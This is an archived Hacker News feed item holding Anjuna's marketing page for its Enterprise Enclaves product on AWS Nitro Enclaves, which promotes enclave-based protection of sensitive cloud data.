Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25501492">thread link</a>) | @boxstream
<br/>
December 21, 2020 | https://www.anjuna.io/amazon-nitro-enclaves | <a href="https://web.archive.org/web/*/https://www.anjuna.io/amazon-nitro-enclaves">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-widget-type="cell" data-x="0" data-w="7">

<div>
<div>
<div data-widget-type="custom_widget" data-x="0" data-w="12">
<p><span id="hs_cos_wrapper_widget_1587145336592_" data-hs-cos-general-type="widget" data-hs-cos-type="rich_text"><h2>Move even the most sensitive applications and data to the cloud.</h2>
<p>Anjuna and AWS have closely collaborated over the last year to optimize Anjuna Enterprise Enclaves running on AWS Nitro Enclaves.</p>
<p>Secure enclaves establish a secure, comprehensive solution that protects data, applications, and storage from insiders and third parties wherever they’re executed and stored—on-premises, and in both private and public clouds.&nbsp;</p>
<p>AWS Nitro Enclaves enable customers to further protect and securely process highly sensitive data, such as personally identifiable information (PII), healthcare, financial, and intellectual property within Amazon EC2 instances. Nitro Enclaves use the same Nitro Hypervisor technology that provides CPU and memory isolation for EC2 instances.</p>
<h2>Data is now secure by default.</h2>
<p>With Anjuna Enterprise Enclaves, data is secure by default. Anjuna builds on the enclave-enabling technology in Nitro Enclaves to extend data protection beyond memory and protection to storage and networks.</p>
<p>Anjuna’s “lift and shift” approach eliminates the need to work with ever-changing applications and software development kits (SDKs). And no changes to applications, recompilation, or operations are required.</p></span></p>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div></div>]]>
            </description>
            <link>https://www.anjuna.io/amazon-nitro-enclaves</link>
            <guid isPermaLink="false">hacker-news-small-sites-25501492</guid>
            <pubDate>Tue, 22 Dec 2020 00:26:53 GMT</pubDate>
        </item>
    </channel>
</rss>
